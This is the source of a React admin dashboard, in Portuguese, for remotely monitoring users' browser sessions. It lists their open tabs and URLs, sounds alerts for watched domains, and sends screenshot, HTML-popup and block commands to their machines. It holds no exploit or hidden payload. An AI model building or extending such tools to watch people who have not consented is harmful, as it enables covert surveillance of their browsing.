import { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Switch } from "@/components/ui/switch";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Slider } from "@/components/ui/slider";
import { 
  Monitor, 
  MessageSquare, 
  Ban, 
  Camera, 
  Play, 
  Volume2, 
  VolumeX,
  AlertTriangle,
  CheckCircle,
  Clock,
  Trash2,
  Edit,
  Plus,
  Users,
  Globe,
  Eye
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { toast } from "sonner";
import Sidebar from "@/components/Sidebar";
import Header from "@/components/Header";
import { useRealtime } from "@/hooks/useRealtime";

interface ActiveSession {
  id: string;
  machine_id: string;
  user_id: string;
  tab_id: string;
  url: string;
  domain: string;
  title: string;
  created_at: string;
  last_activity: string;
  is_active: boolean;
}

interface MonitoredDomain {
  id: string;
  domain: string;
  is_active: boolean;
  alert_type: string;
  alert_frequency: number;
  created_at: string;
}

interface PopupTemplate {
  id: string;
  name: string;
  domain: string;
  html_content: string;
  css_styles: string;
  is_default: boolean;
  created_at: string;
}

interface AdminAlert {
  id: string;
  alert_type: string;
  machine_id: string;
  domain: string;
  url: string;
  triggered_at: string;
  acknowledged_by?: string;
  acknowledged_at?: string;
}

const RemoteControl = () => {
  const { user, isAdmin } = useAuth();
  const [activeSessions, setActiveSessions] = useState<ActiveSession[]>([]);
  const [monitoredDomains, setMonitoredDomains] = useState<MonitoredDomain[]>([]);
  const [popupTemplates, setPopupTemplates] = useState<PopupTemplate[]>([]);
  const [adminAlerts, setAdminAlerts] = useState<AdminAlert[]>([]);
  const [loading, setLoading] = useState(true);
  const [alertsEnabled, setAlertsEnabled] = useState(true);
  const [alertVolume, setAlertVolume] = useState([70]);

  // Audio context for alerts
  const [audioContext, setAudioContext] = useState<AudioContext | null>(null);

  // Realtime updates
  useRealtime({
    onEvent: (event) => {
      if (event.table === 'active_sessions') {
        fetchActiveSessions();
      }
      if (event.table === 'admin_alerts' && event.eventType === 'INSERT') {
        playAlertSound();
        fetchAdminAlerts();
        toast.info('🚨 Nova atividade detectada!', {
          description: `Domínio: ${event.new?.domain}`,
          duration: 5000
        });
      }
    }
  });

  useEffect(() => {
    if (!isAdmin) return;
    
    // Initialize audio context
    const context = new (window.AudioContext || (window as any).webkitAudioContext)();
    setAudioContext(context);
    
    fetchAllData();
  }, [isAdmin]);

  const fetchAllData = async () => {
    setLoading(true);
    await Promise.all([
      fetchActiveSessions(),
      fetchMonitoredDomains(),
      fetchPopupTemplates(),
      fetchAdminAlerts()
    ]);
    setLoading(false);
  };

  const fetchActiveSessions = async () => {
    const { data, error } = await supabase
      .from('active_sessions')
      .select('*')
      .eq('is_active', true)
      .order('last_activity', { ascending: false });
    
    if (error) {
      console.error('Error fetching sessions:', error);
      return;
    }
    
    setActiveSessions(data || []);
  };

  const fetchMonitoredDomains = async () => {
    const { data, error } = await supabase
      .from('monitored_domains')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) {
      console.error('Error fetching monitored domains:', error);
      return;
    }
    
    setMonitoredDomains(data || []);
  };

  const fetchPopupTemplates = async () => {
    const { data, error } = await supabase
      .from('popup_templates')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) {
      console.error('Error fetching popup templates:', error);
      return;
    }
    
    setPopupTemplates(data || []);
  };

  const fetchAdminAlerts = async () => {
    const { data, error } = await supabase
      .from('admin_alerts')
      .select('*')
      .order('triggered_at', { ascending: false })
      .limit(50);
    
    if (error) {
      console.error('Error fetching admin alerts:', error);
      return;
    }
    
    setAdminAlerts(data || []);
  };

  const playAlertSound = () => {
    if (!alertsEnabled || !audioContext) return;
    
    // Create a simple beep sound
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 800; // 800Hz beep
    gainNode.gain.setValueAtTime(0, audioContext.currentTime);
    gainNode.gain.linearRampToValueAtTime(alertVolume[0] / 100, audioContext.currentTime + 0.01);
    gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.5);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.5);
  };

  const sendRemoteCommand = async (type: 'popup' | 'block' | 'screenshot' | 'unblock', session: ActiveSession, payload?: any) => {
    try {
      const { error } = await supabase
        .from('remote_commands')
        .insert({
          command_type: type,
          target_machine_id: session.machine_id,
          target_tab_id: session.tab_id,
          target_domain: session.domain,
          payload: payload || {},
          executed_by: user?.id
        });

      if (error) throw error;

      toast.success(`Comando ${type} enviado com sucesso!`);
      
      // Call the command dispatcher edge function
      await supabase.functions.invoke('command-dispatcher', {
        body: {
          command_type: type,
          target_machine_id: session.machine_id,
          target_tab_id: session.tab_id,
          payload: payload || {}
        }
      });
      
    } catch (error) {
      console.error('Error sending command:', error);
      toast.error('Erro ao enviar comando');
    }
  };

  const addMonitoredDomain = async (domain: string) => {
    try {
      const { error } = await supabase
        .from('monitored_domains')
        .insert({
          domain: domain.toLowerCase(),
          added_by: user?.id,
          is_active: true
        });

      if (error) throw error;
      
      toast.success('Domínio adicionado ao monitoramento!');
      fetchMonitoredDomains();
      
    } catch (error) {
      console.error('Error adding domain:', error);
      toast.error('Erro ao adicionar domínio');
    }
  };

  const toggleDomainStatus = async (domainId: string, isActive: boolean) => {
    try {
      const { error } = await supabase
        .from('monitored_domains')
        .update({ is_active: !isActive })
        .eq('id', domainId);

      if (error) throw error;
      
      toast.success('Status do domínio atualizado!');
      fetchMonitoredDomains();
      
    } catch (error) {
      console.error('Error updating domain:', error);
      toast.error('Erro ao atualizar domínio');
    }
  };

  if (!isAdmin) {
    return (
      <div className="min-h-screen bg-background">
        <div className="flex">
          <Sidebar />
          <div className="flex-1 flex flex-col">
            <Header />
            <main className="flex-1 p-6">
              <div className="text-center py-12">
                <AlertTriangle className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
                <h2 className="text-2xl font-semibold mb-2">Acesso Restrito</h2>
                <p className="text-muted-foreground">
                  Esta página é restrita a administradores do sistema.
                </p>
              </div>
            </main>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="flex">
        <Sidebar />
        <div className="flex-1 flex flex-col">
          <Header />
          <main className="flex-1 p-6">
            <div className="max-w-7xl mx-auto">
              <div className="mb-6">
                <h1 className="text-3xl font-bold tracking-tight">Controle Remoto</h1>
                <p className="text-muted-foreground">
                  Monitore e controle sessões ativas dos usuários em tempo real
                </p>
              </div>

              <Tabs defaultValue="sessions" className="space-y-6">
                <TabsList className="grid w-full grid-cols-4">
                  <TabsTrigger value="sessions" className="flex items-center gap-2">
                    <Monitor className="h-4 w-4" />
                    Sessões Ativas
                  </TabsTrigger>
                  <TabsTrigger value="domains" className="flex items-center gap-2">
                    <Globe className="h-4 w-4" />
                    Domínios Monitorados
                  </TabsTrigger>
                  <TabsTrigger value="templates" className="flex items-center gap-2">
                    <MessageSquare className="h-4 w-4" />
                    Templates Popup
                  </TabsTrigger>
                  <TabsTrigger value="alerts" className="flex items-center gap-2">
                    <Volume2 className="h-4 w-4" />
                    Alertas & Audio
                  </TabsTrigger>
                </TabsList>

                {/* Sessões Ativas */}
                <TabsContent value="sessions">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Users className="h-5 w-5" />
                        Sessões Ativas ({activeSessions.length})
                      </CardTitle>
                      <CardDescription>
                        Todas as abas abertas pelos usuários em tempo real
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      {loading ? (
                        <div className="text-center py-8">Carregando sessões...</div>
                      ) : activeSessions.length === 0 ? (
                        <div className="text-center py-8 text-muted-foreground">
                          Nenhuma sessão ativa encontrada
                        </div>
                      ) : (
                        <Table>
                          <TableHeader>
                            <TableRow>
                              <TableHead>Usuário</TableHead>
                              <TableHead>Domínio</TableHead>
                              <TableHead>URL</TableHead>
                              <TableHead>Atividade</TableHead>
                              <TableHead>Ações</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {activeSessions.map((session) => (
                              <TableRow key={session.id}>
                                <TableCell className="font-medium">
                                  {session.machine_id}
                                </TableCell>
                                <TableCell>
                                  <Badge variant="outline">{session.domain}</Badge>
                                </TableCell>
                                <TableCell className="max-w-md truncate">
                                  {session.url}
                                </TableCell>
                                <TableCell>
                                  <div className="flex items-center gap-2 text-sm text-muted-foreground">
                                    <Clock className="h-3 w-3" />
                                    {new Date(session.last_activity).toLocaleTimeString('pt-BR')}
                                  </div>
                                </TableCell>
                                <TableCell>
                                  <div className="flex gap-2">
                                    <Button 
                                      size="sm" 
                                      variant="outline"
                                      onClick={() => sendRemoteCommand('popup', session, { template_id: 'default' })}
                                    >
                                      <MessageSquare className="h-3 w-3 mr-1" />
                                      Popup
                                    </Button>
                                    <Button 
                                      size="sm" 
                                      variant="outline"
                                      onClick={() => sendRemoteCommand('screenshot', session)}
                                    >
                                      <Camera className="h-3 w-3 mr-1" />
                                      Screenshot
                                    </Button>
                                    <Button 
                                      size="sm" 
                                      variant="destructive"
                                      onClick={() => sendRemoteCommand('block', session)}
                                    >
                                      <Ban className="h-3 w-3 mr-1" />
                                      Bloquear
                                    </Button>
                                  </div>
                                </TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      )}
                    </CardContent>
                  </Card>
                </TabsContent>

                {/* Domínios Monitorados */}
                <TabsContent value="domains">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Globe className="h-5 w-5" />
                        Domínios Monitorados
                      </CardTitle>
                      <CardDescription>
                        Configure domínios que disparam alertas sonoros
                      </CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="flex gap-2">
                        <Input 
                          placeholder="exemplo.com" 
                          id="new-domain"
                          onKeyDown={(e) => {
                            if (e.key === 'Enter') {
                              const input = e.target as HTMLInputElement;
                              if (input.value.trim()) {
                                addMonitoredDomain(input.value.trim());
                                input.value = '';
                              }
                            }
                          }}
                        />
                        <Button 
                          onClick={() => {
                            const input = document.getElementById('new-domain') as HTMLInputElement;
                            if (input.value.trim()) {
                              addMonitoredDomain(input.value.trim());
                              input.value = '';
                            }
                          }}
                        >
                          <Plus className="h-4 w-4 mr-2" />
                          Adicionar
                        </Button>
                      </div>

                      <div className="space-y-2">
                        {monitoredDomains.map((domain) => (
                          <div key={domain.id} className="flex items-center justify-between p-3 border rounded-lg">
                            <div className="flex items-center gap-3">
                              <Switch 
                                checked={domain.is_active}
                                onCheckedChange={() => toggleDomainStatus(domain.id, domain.is_active)}
                              />
                              <div>
                                <div className="font-medium">{domain.domain}</div>
                                <div className="text-sm text-muted-foreground">
                                  Alerta: {domain.alert_type} • Frequência: {domain.alert_frequency}s
                                </div>
                              </div>
                            </div>
                            <Badge variant={domain.is_active ? "default" : "secondary"}>
                              {domain.is_active ? "Ativo" : "Inativo"}
                            </Badge>
                          </div>
                        ))}
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>

                {/* Templates de Popup */}
                <TabsContent value="templates">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <MessageSquare className="h-5 w-5" />
                        Templates de Popup
                      </CardTitle>
                      <CardDescription>
                        Crie e gerencie templates HTML para popups personalizados
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="text-center py-8 text-muted-foreground">
                        Funcionalidade de templates em desenvolvimento...
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>

                {/* Alertas e Audio */}
                <TabsContent value="alerts">
                  <div className="grid gap-6 md:grid-cols-2">
                    <Card>
                      <CardHeader>
                        <CardTitle className="flex items-center gap-2">
                          {alertsEnabled ? <Volume2 className="h-5 w-5" /> : <VolumeX className="h-5 w-5" />}
                          Configurações de Audio
                        </CardTitle>
                      </CardHeader>
                      <CardContent className="space-y-4">
                        <div className="flex items-center justify-between">
                          <Label htmlFor="alerts-enabled">Alertas Sonoros</Label>
                          <Switch 
                            id="alerts-enabled"
                            checked={alertsEnabled}
                            onCheckedChange={setAlertsEnabled}
                          />
                        </div>
                        
                        <div className="space-y-2">
                          <Label>Volume ({alertVolume[0]}%)</Label>
                          <Slider
                            value={alertVolume}
                            onValueChange={setAlertVolume}
                            max={100}
                            step={5}
                            disabled={!alertsEnabled}
                          />
                        </div>

                        <Button 
                          onClick={playAlertSound}
                          disabled={!alertsEnabled}
                          variant="outline"
                        >
                          <Play className="h-4 w-4 mr-2" />
                          Testar Som
                        </Button>
                      </CardContent>
                    </Card>

                    <Card>
                      <CardHeader>
                        <CardTitle className="flex items-center gap-2">
                          <AlertTriangle className="h-5 w-5" />
                          Alertas Recentes
                        </CardTitle>
                      </CardHeader>
                      <CardContent>
                        <div className="space-y-2 max-h-64 overflow-y-auto">
                          {adminAlerts.slice(0, 5).map((alert) => (
                            <div key={alert.id} className="flex items-center gap-3 p-2 border rounded">
                              <AlertTriangle className="h-4 w-4 text-warning" />
                              <div className="flex-1 min-w-0">
                                <div className="text-sm font-medium truncate">{alert.domain}</div>
                                <div className="text-xs text-muted-foreground">
                                  {new Date(alert.triggered_at).toLocaleString('pt-BR')}
                                </div>
                              </div>
                              {alert.acknowledged_at && (
                                <CheckCircle className="h-4 w-4 text-success" />
                              )}
                            </div>
                          ))}
                        </div>
                      </CardContent>
                    </Card>
                  </div>
                </TabsContent>
              </Tabs>
            </div>
          </main>
        </div>
      </div>
    </div>
  );
};

export default RemoteControl;